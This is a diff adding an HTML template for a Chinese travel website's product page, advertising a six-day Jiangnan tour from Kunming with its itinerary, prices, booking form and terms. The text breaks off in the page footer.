@@ -1,0 +1,730 @@
+
+<!DOCTYPE HTML>
+<html xmlns:th="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8">
+    <title>记忆之旅</title>
+    <meta name="description" content="昆明出发到上海无锡旅游度假，逍遥尊贵江南6日游，云度提供华东旅游最新报价。电话：0871-63166631" />
+    <link href="http://xnxw.cncnimg.cn/css/front/base.css" rel="stylesheet" type="text/css" />
+    <link href="http://xnxw.cncnimg.cn/css/front/templet2/home1.css?v=0317" rel="stylesheet" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="http://xnxw.cncnimg.cn/css/front/templet2/show1.css?v=20160519" />
+    <link href="http://xnxw.cncnimg.cn/css/front/templet2/home1_color1.css?v=0317" rel="stylesheet" type="text/css" />
+</head>
+<!--[if lt IE 8]>
+<script>var auto;</script>
+<![endif]-->
+
+<body style="background:#D5F2FA url(http://x1.cncnimg.cn/p10068/10/daf8.jpg) no-repeat center top">
+
+<div class="warpper">
+
+    <div id="site_nav">
+        <div class="site_nav_bd">
+            <div class="login" th:if="${deng1}!=null"><em>欢迎来到记忆之旅 </em>
+                <em>欢迎来到记忆之旅 </em><a href="getuser.action" ><span th:text="${deng1}" id="name"></span></a>|<a href="logout.action" rel="nofollow">退出</a>
+            </div>
+            <div class="login" th:if="${deng1}==null"><em>欢迎来到记忆之旅 </em>
+                <a href="login.html">登录</a>|<a href="register.html" rel="nofollow">免费注册</a>
+            </div>
+            <div class="quick_menu">
+                <div class="top_ewm">
+                    <a class="mobile"><img src="http://x1.cncnimg.cn/p10068/10068_code.jpg" /></a>
+                </div>
+                <em>旅行社业务经营许可证 <a href="/about" target="_blank">L-YN-CJ00009</a></em>
+                <a href="/member/guester" rel="nofollow">订单查询</a>|
+                <a href="/pay_order" rel="nofollow">快捷支付</a>|            <a href="javascript:;" onClick="addBookMark()" rel="nofollow">加入收藏</a>|
+                <a href="/sitemap">网站导航</a>
+            </div>
+        </div>
+    </div>
+    <div class="header fn-clear">
+        <div class="top">
+            <div class="logo">
+                <p><a href="/"><img src="http://x1.cncnimg.cn/p10068/374/4157.jpg" title="云游旅行网" /></a></p>
+            </div>
+            <div class="search">
+                <div class="search_con"><form action="/search" target="_self" method="get"><input type="text" name="key"  class="search_txt" value="" /><input type="submit" value="搜索" class="search_sub" /></form></div>
+                <p>
+                    <em>热门搜索：</em>
+                    <a href="/search/%C0%F6%BD%AD">丽江</a>
+                    <a href="/search/%BD%CE%D7%D3%D1%A9%C9%BD">轿子雪山</a>
+                    <a href="/search/%D4%C3%B4%BB%B6%C8%BC%D9%BE%C6%B5%EA">悦椿度假酒店</a>
+                </p>
+            </div>
+            <div class="phone_top">
+                <p class="space_line"><i></i>预定热线</p>
+                <p><strong style="font-size:20px !important;">0871-63166631</strong></p>
+            </div>
+
+        </div>
+        <div class="nav_layer">
+            <div class="nav_layer_con">
+                <ul>
+                    <li class="all_pro"><span>全部旅游产品分类</span></li>
+                    <li  class="#"><a href="/"><span>首页<i class=""></i></span></a></li>
+                    <li ><a href="#"><span>门票<i ></i></span></a></li>
+                    <li ><a href="/lvyou"><span>旅游<i ></i></span></a></li>
+                    <li ><a href="#"><span>景点<i ></i></span></a></li>
+                    <li ><a href="#"><span>目的地<i ></i></span></a></li>
+                    <li ><a href="#"><span>攻略<i ></i></span></a></li>
+                    <li ><a href="#"><span>旅游专题<i ></i></span></a></li>
+                    <li ><a href="#"><span>个人社区<i class="hot1"></i></span></a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    <script src="http://xnxw.cncnimg.cn/js/jquery1.10.2.min.js"></script>
+    <script src="http://xnxw.cncnimg.cn/js/front/base.js"></script>
+    <script type="text/javascript">
+        $(function(){
+            $('.J_ercode').mouseover(function(){
+                $(this).find('.J_code_img').show();
+            });
+            $('.J_ercode').mouseout(function(){
+                $(this).find('.J_code_img').hide();
+            });
+        });
+    </script>
+
+    <script src="http://xnxw.cncnimg.cn/js/line.js" type="text/javascript"></script>
+    <script src="http://xnxw.cncnimg.cn/js/zixun.js" type="text/javascript"></script>
+    <script type="text/javascript" src="/My97DatePicker/WdatePicker.js"></script>
+    <script src="/js/jquery-2.1.4.js"></script>
+    <script>
+        $(document).ready(function() {
+            $("#line_order").click(function () {
+                var date = document.getElementById("shijian").value;
+                $.ajax({
+                    type: "post",
+                    url: "ceshi",
+                    dataType:"json",
+                    success: function (data) {
+                      if(data!=0){
+                            $("#user_Id").val(data)
+                       }else if(data==0) {
+                          alert("请登入或者注册 3秒跳转登入页面")
+                          setTimeout(function(){window.location="login.html";},3000);
+                          return false;
+                      }
+                    }
+                })
+                if (date == "") {
+                    alert("请选择出发时间");
+                    return false;
+                }
+            })
+        })
+    </script>
+    <body>
+    <style>
+        #line_tip span {
+            display: inline-block;width: 48%;
+        }
+        .clearfix:after {
+            display: block;
+            content: '\200B';
+            clear: both;
+            height: 0;
+        }
+    </style>
+    <style type="text/css">
+        /* 效果CSS开始 */
+        div.jd_detail{
+            position:relative;
+            width:755px;
+            margin:5px;/*设置元素跟其他元素的距离为5像素*/
+        }
+        div.jd_img {
+            width:200px;
+            margin:1px;/*设置元素跟其他元素的距离为1像素*/
+            float:left;
+            /*background:#900;*/
+        }
+        div.jd_title {
+            width:550px;
+            margin:1px;/*设置元素跟其他元素的距离为1像素*/
+            float:right;/*设置浮动，实现多列效果，div+Css布局中很重要的*/
+            /*background:#90C;*/
+        }
+        div.jd_jianjie_img {
+            width:750px;
+            font-size: 13px;
+            margin:1px;/*设置元素跟其他元素的距离为1像素*/
+            float: left;
+            /*background-color: #00b834;*/
+        }
+        div.jd_jianjie_text {
+            width:750px;
+            font-size: 13px;
+            margin:1px;/*设置元素跟其他元素的距离为1像素*/
+            float: left;
+            /*background-color: #00b834;*/
+        }
+        .Clear{
+            clear:both;
+        }
+
+    </style>
+
+
+    <input type="hidden" id="uid" value="0">
+    <input type="hidden" id="sale_member" value="0">
+    <div class="main fn-clear">
+
+        <div class="top_box full" th:each="scenery:${scenery}">
+
+            <h1><strong>&lt;<span th:text="${scenery.scenery_Type}"></span>&gt;</strong><span th:text="${scenery.scenery_Title}"></span><em style="font-size: 16px;" th:text="${scenery.scenery_Introduce}"></em></h1>
+            <div class="top_lft">
+                <div class="pic">
+                    <a th:href="${scenery.scenery_Img}" target="_blank" title="&lt;玩转江南&gt;昆明到华东双飞6日游（升级版）"  th:attr="title=${scenery.scenery_Title}"><img src="" th:attr="src=${scenery.scenery_Img}" onerror="this.src='http://xnxw.cncnimg.cn/images/front/nopic_m.jpg'; this.onerror=null;"  width="450" height="300" ></a>
+                </div>
+                <div class="share_box">
+                    <div class="scxl"><a href="/member/fav/270198/?typeid=2" target="_self" rel="nofollow" >收藏</a></div>
+                    <div class="print"><a href="/line/print_detail/270198" target="_blank" rel="nofollow" ><img src="http://xnxw.cncnimg.cn/images/front/print.gif">打印</a></div>
+                    <div class="bdsharebuttonbox">
+                        <a href="#" class="bds_more" data-cmd="more"></a>
+                        <a title="分享到QQ空间" href="#" class="bds_qzone" data-cmd="qzone"></a>
+                        <a title="分享到新浪微博" href="#" class="bds_tsina" data-cmd="tsina"></a>
+                        <a title="分享到腾讯微博" href="#" class="bds_tqq" data-cmd="tqq"></a>
+                        <a title="分享到人人网" href="#" class="bds_renren" data-cmd="renren"></a>
+                        <a title="分享到微信" href="#" class="bds_weixin" data-cmd="weixin"></a>
+                    </div>
+                </div>
+            </div>
+            <script src="https://cdn.bootcss.com/angular.js/1.4.6/angular.min.js"></script>
+            <div class="top_rht">
+                <div class="txt" >
+                    <ul >
+                        <li><dfn>门 市 价：</dfn><del id="price">&yen;<span th:text="${scenery.MenShi}"></span></del></li>
+                        <li class="price" style="width:100% !important;"><dfn>优 惠 价：</dfn><em>&yen;<b id="price_cncn" th:text="${scenery.scenery_Price}"></b></em>起
+                        &nbsp;儿童价：<em>&yen;<b id="price_cncn_child" th:text="${scenery.ErTong}"></b></em>起
+
+                        <span class = "price_tooltip">起价说明</span>
+                        <div class = "tooltip_con">
+                            <div class = "inline_border">
+                                <i class = "arrow"></i>
+                                <div class = "item"><strong>1.本起价是从所有可选出发日期中选出的最低单人价格，</strong>实际产品价格会根据您所选择的出发日期、出行人数、服务标准、入住酒店房型、航班或交通以及所选附加服务的不同而有所差别；</div>
+                                <div class = "item"><span class = "orange">2.最终预订价格，以旅行社确认后为准</span></div>
+                                <div class = "item">3.若出行中有(儿童、老人、学生、军人、伤残人士)等特殊人群，可先在线提交订单，客服会联系您确认相关优惠政策；</div>
+                                <div class = "item">4.若发现产品虚假报价，您可以举报，一经核实会及时删除该产品！</div>
+                            </div>
+                        <li><dfn>发团日期：</dfn><sapn th:text="${scenery.scenery_Daytime}"></sapn>,请提前<strong>4</strong>天报名</li>
+                        <li><dfn>出发城市：</dfn><span th:text="${scenery.scenery_Address}"></span>                     </li>
+                        <li><dfn>行程天数：</dfn><span th:text="${scenery.scenery_Day}"></span>天</li>
+                        <li><dfn>交通方式：</dfn><span th:text="${scenery.scenery_Rode}"></span></li>
+                    </ul>
+                </div>
+
+                <div class="key">
+                    <dl>
+                        <dt>套餐类型：<span th:text="${scenery.scenery_Type}"></span></dt>
+                    </dl>
+
+                    <dl>
+                        <dd >
+                            <form id="line_order"  method="post" action="/GetOrderForm">
+                                <dl>
+                                    <dt>出发日期：</dt>
+                                    <dd>
+                                        <input placeholder="点击选择出发日期" type="text" name="orderform_Date"
+                                                    class="Wdate" onclick="WdatePicker({dateFmt:'yyyy-MM-dd'})"  id="shijian"/>
+                                        <span class="suggest">建议在前 3 天 18:00:00 点前预订</span>
+                                    </dd>
+                                    <dd style="margin: 10px 0 0 71px;color: rgb(255, 85, 34); line-height: 1.5;display: none"  class="select_date_first">请先选择出发日期！</dd>
+                                </dl>
+
+                                <span>成人:</span><input name="adult_Num" type="text" value="1" class="text text30" id="adult_Num"> &nbsp;&nbsp;
+                                <span>儿童:</span><input name="child_Num"  type="text" value="0" class="text text30"> <span></span>
+                                <input  type="hidden" th:value="${scenery.scenery_Title}" name="orderform_Title">
+                                <input  type="hidden" th:value="${scenery.scenery_Price}" name="Money">
+                                <input  type="hidden" th:value="${scenery.scenery_Address}" name="orderform_Address">
+                                <input  type="hidden" th:value="${scenery.scenery_Day}" name="orderform_Day">
+                                <input  type="hidden" th:value="${scenery.scenery_Rode}" name="orderform_Rode">
+                                <input  type="hidden" th:value="${scenery.scenery_Type}" name="orderform_Type">
+                                <input  type="text" name="user_Id" id="user_Id" >
+                                <span style="width:125px; height:36px;">
+                        <input name="imageField" type="image" src="http://xnxw.cncnimg.cn/images/front/home/btn_order.png" alt="立刻预订" onClick="line.order()">
+                                <!--<input type="submit" value="提交">-->
+                                </span>
+                            </form>
+                        </dd>
+                    </dl>
+                    <div class="button">
+                        <!--<span id="stock_explan" style="display:none"></span>-->
+                        <s class="tel"><var>或直接拨打</var><em title="0871-63166631">0871-63166631</em>咨询/预订</s>
+                        <div id="orange">已选择了“<em id="select_typename" th:text="${scenery.scenery_Type}"></em>”<em id="from_date"></em></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="lft">
+            <div class="f_prompt">
+                <div class="f_block_bg"></div>
+                <div class="f_prompt_cont">
+                    <div class="f_title">系统提示</div>
+                    <p class="f_prompt_ph">该产品需要登录才能预订</p>
+                    <a class="f_sign_in" href="javascript:window.location.href='/member/login?ref='+window.location.pathname;" title="登录">立即登录</a>
+                    <a class="f_chat_master" href="/member/register" title="注册">马上注册</a>
+                    <a class="f_close_btn" href="javascript:void(null);" title="关闭弹窗"></a>
+                </div>
+            </div>
+            <div class="box790">
+                <div class="tag_top" id="js_tag_top">
+                    <a href="#?" class="on" id="xingcheng"><i></i>线路行程</a>
+                    <a href="#?" id="explain"><i></i>费用说明</a>
+                    <a href="#?" id="fee"><i></i>预定指南</a>
+                    <a href="#?" id="review"><i></i>游客点评</a>                    <a href="#?" id="zixun"><i></i>在线咨询</a>
+                </div>
+                <div class="tag_con" id="content">
+                    <div id="content_xingcheng">
+
+                        <br />
+                        <div class="stroke_day">
+                            <div class="title">
+                                <em>第1天</em>昆明—南京
+                            </div>
+                            <div class="stroke_con">
+                                <div class="type">
+                                    <span>用餐早餐：敬请自理</span><span>午餐：敬请自理</span><span>晚餐：敬请自理</span><span>住宿：南京</span>
+                                </div>
+                                <p class="J_editor_show"><p><font color="#666666">乘飞机抵南京后，专车接站，送至酒店，自由活动！<br/></font></p><p><font color="#666666">温馨提示：因散客拼团，每团接站车次较多，抵达时间先后不等（注：同一交通方式抵达前后不超过30分钟）我们特别为尊贵的客人安排了专车接站。导游会提前一天与客人联系，接到客人后统一送至集合地点。特别安排：专车接站，客人出行无忧；</font><br/></p><p></p></p>
+                                <div class="pic">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="stroke_day">
+                            <div class="title">
+                                <em>第2天</em>南京—无锡
+                            </div>
+                            <div class="stroke_con">
+                                <div class="type">
+                                    <span>用餐早餐：√</span><span>午餐：√</span><span>晚餐：敬请自理</span><span>住宿：无锡</span>
+                                </div>
+                                <p class="J_editor_show"><p><font color="#666666">7:30早餐后出发<br/></font></p><p><font color="#666666">8:20游南京最具历史、文化代表的标志性景点<b>【中山陵】</b>（游览不少于1.5小时，周一闭馆）：参观博爱坊墓道、陵门、碑亭、祭堂、墓室等；<br/></font></p><p><font color="#666666">10:00出发前往无锡(车程约2.5小时)<br/></font></p><p><font color="#666666">12:30到达无锡后，用中餐<br/></font></p><p><font color="#666666">13:00到达无锡后游览太湖之滨、佛教圣地【<b>灵山大佛</b>】（游览不少于3小时）：游览东方第一大佛—灵山大佛，祥符禅寺，观大型动态音乐群雕——九龙灌浴、阿育王柱、观耗资17个亿打造的现代艺术宝殿梵宫，摸佛手、求福寿，赏太湖美景。<br/></font></p><p><font color="#666666">18:00入住酒店<br/></font></p><p><font color="#666666">18:30游【<b>南禅寺</b>】商业街（游览不少于2小时），自费品尝特色小吃，船游清名桥古运河，有"古运河绝版精华地"美誉的"江南水弄堂"。沿岸的桨声、灯影、古桥、民居构成了一幅天然的古运河"民俗风情水上画卷"。</font><br/></p></p>
+                                <div class="pic">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="stroke_day">
+                            <div class="title">
+                                <em>第3天</em>无锡—上海
+                            </div>
+                            <div class="stroke_con">
+                                <div class="type">
+                                    <span>用餐早餐：√</span><span>午餐：√</span><span>晚餐：敬请自理</span><span>住宿：上海</span>
+                                </div>
+                                <p class="J_editor_show"><p><font color="#666666">7:30早餐后出发<br/></font></p><p><font color="#666666">8:30游览苏州西郊、春秋苏州城旧址【<b>木渎古镇</b>】“乾隆六次去过的地方”，乘摇橹小船游充满吴王和西施故事的香溪、永安桥等，之后游览苏州著名的私家园林【<b>严家花园</b>】和江南皇家园林、乾隆行宫【<b>虹饮山房</b>】<br/></font></p><p><font color="#666666">11:00参观【<b>苏和盛珍珠博物馆</b>】，光绪年间，江南知名珍珠铺“苏和盛堂”名噪一时，因所育太湖淡水珍珠，形状圆润，光洁无瑕，天然无核等特色，于1886年被慈禧册封为“五品御珠”，专供朝廷使用。民国初年，“苏和盛”所产五品御珠，亦是上海、苏州名媛追捧的佳品，一时供不应求。<br/></font></p><p><font color="#666666">12:00中餐<br/></font></p><p><font color="#666666">13:30【<b>枫桥</b>】（“解读苏州从枫桥开始”，古关—铁岭关、古河—京杭大运河、古桥—枫桥、古镇—枫桥古镇等。“月落乌啼霜满天，江枫渔火对愁眠，姑苏城外寒山寺，夜半钟声到客船。”--唐.张继）<br/></font></p><p><font color="#666666">15:00出发前往上海（车程约2小时）<br/></font></p><p><font color="#666666">17:30游览【<b>城隍庙</b>】（参观时间约1.5小时）：上海市老城隍庙坐落于上海市最为繁华的城隍庙旅游区，是上海地区重要的道教宫观，始建于明代永乐年间（1403-1424），距今已有近六百年的历史。如今，这里已经成为了熙熙攘攘的所在，在老城隍庙内，汇集了众多的上海地方小吃，绿波廊的特色点心，松月楼的素菜包，桂花厅的鸽蛋圆子，松云楼的八宝饭，还有南翔小笼和酒酿圆子，真可称得上是小吃王国了。<br/></font></p><p><font color="#666666">19:30游览【<b>金茂大厦+浦江游船（游览时间约2小时</b>）】【<b>金茂大厦</b>】登金茂大厦88层观光厅，赏浦江两岸绝色风景；世界第四，亚洲第三，中国第二的高楼；观赏世界举世无双的酒店中庭；是目前国内最高最大的观光厅</font><font color="#666666">。浦江游船，尽览浦江两岸繁华。</font></p></p>
+                                <div class="pic">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="stroke_day">
+                            <div class="title">
+                                <em>第4天</em>乌镇—杭州
+                            </div>
+                            <div class="stroke_con">
+                                <div class="type">
+                                    <span>用餐早餐：√</span><span>午餐：√</span><span>晚餐：√</span><span>住宿：杭州</span>
+                                </div>
+                                <p class="J_editor_show"><p><font color="#666666">7:30早餐后车赴乌镇（车程约2小时）<br/></font></p><p><font color="#666666">9:30游览“中国最后的枕水人家”--<b>【乌镇东栅】</b>（游览不少于2小时）江南王牌水乡，世界级休闲度假小镇。江南古镇的封面！一样的古镇，百床馆，染坊，茅盾故居，只有小桥流水人家。青石板的老街长弄，纵横的古桥，石雕木雕。<br/></font></p><p><font color="#666666">11:30乌镇景区用中餐<br/></font></p><p><font color="#666666">12:00乘车前往杭州（车程约1.5小时）<br/></font></p><p><font color="#666666">14:00漫步西湖（不上岛，游览不少于3小时）：西湖北线，孤山烟岚、平湖秋月，曲苑风荷等。西湖风景区是一处以秀丽清雅的湖光山色与璀璨丰蕴的文物古迹和文化艺术交融一体的国家级风景名胜区，漫步苏堤。<br/></font></p><p><font color="#666666">18:30游览<b>【宋城主题公园+宋城千古情，游览+欣赏演出】</b>（游览不少于2.5小时）：失落古城、怪街、市井街、宋城河、千年古樟、九龙广场、城楼广场、聊斋惊魂、南宋风情街等景点一步一景；欣赏宋城股份公司打造世界三大名秀之一<b>《宋城千古情》</b>：“给我一天，还你千年”，清明上河图的真实再现。<br/></font></p><p><font color="#666666">21:30返回酒店</font><br/></p></p>
+                                <div class="pic">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="stroke_day">
+                            <div class="title">
+                                <em>第5天</em>杭州—上海
+                            </div>
+                            <div class="stroke_con">
+                                <div class="type">
+                                    <span>用餐早餐：√</span><span>午餐：√</span><span>晚餐：敬请自理</span><span>住宿：南京</span>
+                                </div>
+                                <p class="J_editor_show"><p><font color="#666666">8:00早餐后出发<br/></font></p><p><font color="#666666">9:00游【<b>虎跑梦泉</b>】（游览不少于1小时），被誉为“天下第三泉”,既可赏名山、又可听名泉，还可访名寺谒名僧。有滴翠岩、叠翠轩、罗汉堂、钟楼、碑室、济公殿、济公塔、虎跑梦泉塑像、弘一法师(李叔同)之塔等众多景点。<br/></font></p><p><font color="#666666">10:30参观丝绸文化博物馆（参观时间约1小时）了解江南丝绸文化。<br/></font></p><p><font color="#666666">11:30<b>游龙井茶园</b>（参观时间约半小时）茶园连绵起伏，青翠连天，呈现出一幅清新自然的茶村风光；并在此用中餐—乾隆御茶宴<br/></font></p><p><font color="#666666">12:00中餐<br/></font></p><p><font color="#666666">13:00中餐后车赴南京（车程约4小时）<br/></font></p><p><font color="#666666">17:30游览【<b>夫子庙-秦淮风光带</b>】(自由活动约1.5小时)国家级风景区，5A级景区，含六朝风流之地--乌衣巷、文德桥、天下文枢坊、天下第一壁、秦淮河（泮池段）、夫子庙广场、东西市等。朱雀桥边野草花，乌衣巷口夕阳斜。旧时王谢堂前燕，飞入寻常百姓家。<br/></font></p><p><font color="#666666">19:30集合回酒店</font><br/></p></p>
+                                <div class="pic">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="stroke_day">
+                            <div class="title">
+                                <em>第6天</em>上海—昆明
+                            </div>
+                            <div class="stroke_con">
+                                <div class="type">
+                                    <span>用餐早餐：√</span><span>午餐：敬请自理</span><span>晚餐：敬请自理</span><span>住宿：</span>
+                                </div>
+                                <p class="J_editor_show"><p><font color="#666666">结束愉快行程，导游根据客人返程时间统一安排送站，期待我们再次携手同游华东！</font></p></p>
+                                <div class="pic">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="content_explain">
+                        <div class="cost">
+                            <h4>费用说明</h4>
+                            <strong>成人价</strong>
+                            <p class="J_editor_show"> <p><br/></p><p> <br/></p><p>  <br/></p><p>交通： 昆明/南京往返机票，空调旅游车，保证1-3个空位，17座空调旅游车无行李箱；</p><p>住宿：住宿: 全程品牌快捷酒店，参考酒店如下：</p><p>南京：格林、如家、莫泰、苏安、苏荷怡宁、东方之星连锁<br/></p><p>无锡：格林、如家、锦江、速八、尚客优、莫泰<br/></p><p>上海：格林、如家、莫泰、锦江、金广连锁<br/></p><p>杭州升级四星标准酒店:国泰、郡富国际<br/></p><p>温馨提示：全程入住指定酒店，不提供自然单间，产生单房差由客人自理；客人报名人数系单数，我社尽量安排拼住或三人间。如宾馆无三人间或无法协调，需由客人承担产生的单房差（单房差400元/人）。<br/></p><p>用餐：含5早5正餐，酒店早餐，正餐20元/人 (安排杭州特色茶餐，全程用餐选择社会餐厅，绝不到旅游团队餐厅用餐)</p><p>景点：所列景点大门票，景区小交通自理；中山陵、灵山景交及西湖游船等小景交不属于自费项目；不允许私自增加行程外其余自费项目和购物店。</p><p>自费： 白+黑无自费</p><p>购物：丝绸、珍珠均为博物馆性质，博物馆内有购物场所，请客人谨慎购买，索要发票</p><p>导游：江苏逍遥民间国际旅行社优秀地陪导游服务；</p><p>儿童标准： 1.2米以下：含车位，早餐、正餐半餐、导服，其余产生自理！</p><p> 接站送站：</p><p>接站：乘飞机的游客抵港后，专车接站。</p><p>  注：1、因散客拼团，每团接站车次较多，抵达时间先后不等（同一交通方式抵达前后不超过30分钟）我们特别为尊贵的客人安排专车接站。<br/></p><p>  2、导游会提前一天与客人联系，接到客人后统一送至集合地点。<br/></p><p>  送站：根据客人航班安排送站。<br/></p><p> 保险： 只含旅行社责任险，建议游客自行购买旅游意外险；</p></p>
+                        </div>
+                    </div>
+                    <div id="content_fee">
+                        <div class="cost">
+                            <h4>预定指南</h4>
+                            <p class="J_editor_show">1、持有军官证、残疾证、老年证等证件的游客请提前告知报名处或者导游，在景区出示相关证件后如享受免票政策进入的，我社可按照行程中所含景点与旅行社协议折扣价将门票费用退还给客人，费用由导游现退给客人；如按照儿童不含门票的报价报名的客人在游览过程中身高超高产生门票者，门票费用现付导游。<br/>2、以上行程在不减少景点的情况下本社有权做出调整，因不可抗力因素或政治性调整造成无法游览，只负责退还本社的优惠门票（赠送景点不退）；游客因个人原因临时自愿放弃游览、用餐、住宿等，费用一概不退。<br/>3、客人如若自行离团，未发生的景点门票按照旅行社和景区的协议折扣价退还（赠送景点、车费、导服费不退）。<br/>4、酒店住宿安排以双标间（1间房入住2人）为主，若不能拼房出现自然单间由客人自行补足房差或加床费用60元/人*晚，提前入住以及延住由于不能同团队入住需拿散客房，高级型标准间140元/双标*晚（不含早），提前入住、延后入住都不含接送站。<br/>5、我社接待质量以客人意见单为准，如客人对接待有不满或有投诉意向请于第一时间向导游或公司提出，争取第一时间解决问题；请认真填写意见单，返回后，我社概不接受投诉。<br/>6、因为是散客拼团，接团可能出现1-4小时等待时间，送站会提早，出现1-4小时自由活动时间，敬请谅解。7、行程内的另行付费项目也是行程安排内容（请组团社在游客报名时用合同形式说明），但游客可自由选择参与，不参与的团友可安排送回酒店休息。<br/>8、我社对18岁以下的未成年人和60岁以上游客不承担监护权；游客须自行保管自己贵重物品，如游客因自身原因遗失物品，由客人自行负责，旅行社及导游有义务协助寻找或报案，但不负责因此而造成的一切赔偿及相关的任何投诉。<br/>9、南北方存在饮食方面的差异，请客人尽量适应当地的饮食习惯，不得因饮食不习惯而投诉。<br/>10、旅行社已经购买旅行社责任险，建议游客购买旅游人身伤害意外险，为自己提供全方位的保障。<p><br/></p></p>                        <strong>温馨提示</strong>                        <p class="J_editor_show"><p>1、行程中所列时间为参考时间，在保证景点不减少的情况下，旅行社有权调整行程景点、住宿的先后顺序及时间调整；以上城市之间的行程及景点时间有可能互调，因不可抗因素造成无法游览，只负责退还本社的优惠门票，不承担由此造成的其它损失。<br/></p><p>2、 团队行程开始后游客因个人原因临时自愿放弃游览、用餐、住宿等，费用一概不退；<br/></p><p>3、 持有军官证、残疾证等证件的游客在所有景区出示相关证件后产生免票的，仅退还行程中所含景点旅行社折扣价，由导游现退给客人；因我社团队优惠价已低于老年证、学生证优惠价，所以老年证、学生证一概不退门票。<br/></p><p>4、 请勿在我公司指定的购物点外购买商品，如遇问题，我公司概不负责。<br/></p><p>5、 由于有关环保法律和政策要求，自由活动期间旅游大巴停运，期间可能不会开放车内空调或暖气。<br/></p><p>6、 江苏逍遥民间国际旅行社有限公司对本行程具有最终解释权。<br/></p></p>                    </div>
+                    </div>
+
+
+
+                    <div id="content_review">
+                        <div class="review">
+                            <h4>游客评价</h4>
+                            <div id="comment_main">
+                                <div class="review_top">
+                                    暂无评论
+                                </div>
+                            </div>
+                        </div>
+
+
+
+                        <script>
+                            $.myPlugin.tag("#js_tag1_top","#js_tag1_con","on",3);
+                        </script>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+
+        <div class="rht">
+            <div class="promise">
+                <strong>服务承诺</strong>
+                <p><i class="i0"></i>全程价格透明 明白消费</p>
+                <p><i class="i1"></i>精心筛选行程 品质享受</p>
+                <p><i class="i2"></i>绝无强制消费 正规服务</p>
+                <p><i class="i3"></i>品牌质量保证 支付安全</p>
+            </div>
+        </div>
+    </div>
+
+
+    <script src="http://xnxw.cncnimg.cn/js/cp/jquery1.10.2.js"></script>
+    <script src="http://xnxw.cncnimg.cn/js/cp/jquery-migrate1.2.1.js"></script>
+    <script type="text/javascript">
+        var jQuery_1_10_2 = $.noConflict(true);
+    </script>
+    <script src="http://xnxw.cncnimg.cn/js/cp/editor.js"></script>
+
+    <script>
+        $('.J_editor_show').each(function(){
+            var self = $(this);
+            var html = self.html();
+            self.html(Editor_cncn.prototype.contentDecode(html,true));
+        });
+        $(".price_tooltip").hover(function(){
+            var top = $(this).position().top + 23;
+            var left = $(this).position().left - 100;
+            $(".tooltip_con").css({
+                "top":top,
+                "left":left
+            });
+            $(".tooltip_con").show();
+        },function(){
+            $(".tooltip_con").hide();
+        });
+        $(".tooltip_con").hover(function(){
+            $(this).show();
+        },function(){
+            $(this).hide();
+        });
+        //    $("li.jd_jingdian").hover(function(){
+        //        $(this).find("div.jd_jianjie").show();
+        ////        alert("1+1=1");
+        //
+        //    },function(){
+        //        $(this).find("div.jd_jianjie").hide();
+        //
+        //    });
+        $("a.show_jd_detail").click(function () {
+            var a = $(this).attr("div_value");
+            $(".jd_jianjie_img").hide();
+            $("#jd_" + a).toggle("normal");
+        })
+
+        jd = {
+            show_img: function (jd_id) {
+                $(".jd_jianjie_text").hide();
+                $("#show_jd_img_"+jd_id).toggle("normal");
+
+                jQuery.ajax({
+                    type: "POST",
+                    url: '/line/ajax_jd_img/' + jd_id,
+                    data: {},
+                    dataType: 'json',
+                    success: function (data) {
+//                    console.log(data);
+                        var html = "<div class='txt'> <ul>";
+                        for(var i=0;i<data.arr_size;i++) {
+                            if(i%3==0) {
+                                html +="</ul><ul>";
+                            }
+                            html += "<li><img width='180' height='108' alt='"+data.img[i]+"' src='"+data.img[i]+"' /><span>"+(i+1)+"</span></li>";
+                        }
+                        html +="</ul></div><div class=\"clear\"></div>";
+                        jQuery("#show_jd_img_"+jd_id).html(html);
+                        var scrollTop = $('body').scrollTop();
+                        scrollTop = scrollTop - 36;
+                        $('body').scrollTop(scrollTop);
+                    },
+                    error: function () {
+//                    console.log("something wrong!");
+                    }
+                });
+            }
+        }
+    </script>
+
+
+    <script>
+        window._bd_share_config={
+            "common":{
+                "bdSnsKey":{},
+                "bdText":"",
+                "bdMini":"2",
+                "bdMiniList":false,
+                "bdPic":"",
+                "bdStyle":"0",
+                "bdSize":"16"},
+            "share":{},
+            "image":{
+                "viewList":["qzone","tsina","tqq","renren","weixin"],
+                "viewText":"分享到：",
+                "viewSize":"16"},
+            "selectShare":{
+                "bdContainerClass":null,
+                "bdSelectMiniList":["qzone","tsina","tqq","renren","weixin"]}
+        };</script>
+
+    <script id="bdshell_js"></script>
+    <script>
+        var bds_config = { 'bdPic':'http://x1.cncnimg.cn/p10068/368/a6ba.jpg!m2' };
+        document.getElementById("bdshell_js").src = "http://share.baidu.com/static/js/shell_v2.js?t=" + new Date().getHours();
+
+        // 关闭登录弹窗
+        $('.f_prompt .f_close_btn, .f_prompt .f_block_bg').click(function() {
+            $('.f_prompt').css('display', 'none');
+        });
+    </script>
+    <div id="showPrompt">
+        <div class="msg_mask"></div>
+        <div class="msg_cont">
+            <p>消息</p>
+            <input type="button" value="确定">
+        </div>
+    </div>
+
+
+
+    <div class="footer">
+        <div class="help">
+            <div class="txt bd_l0"><i class="i1"></i>
+                <strong>轻松成为旅行玩家</strong>
+                <p><a href="/help//5547" rel="nofollow" alt="旅行要知道" title="旅行要知道">旅行要知道</a></p>
+                <p><a href="/help//5548" rel="nofollow" alt="怎么选择一次好的旅行" title="怎么选择一次好的旅行">怎么选择一次好的旅行</a></p>
+                <p><a href="/help//5549" rel="nofollow" alt="旅行常见问题" title="旅行常见问题">旅行常见问题</a></p>
+                <p><a href="/help//5550" rel="nofollow" alt="旅游工具箱" title="旅游工具箱">旅游工具箱</a></p>
+            </div>
+            <div class="txt "><i class="i1"></i>
+                <strong>怎么预订</strong>
+                <p><a href="/help//5551" rel="nofollow" alt="旅游预订方式" title="旅游预订方式">旅游预订方式</a></p>
+                <p><a href="/help//5553" rel="nofollow" alt="预订常见问题" title="预订常见问题">预订常见问题</a></p>
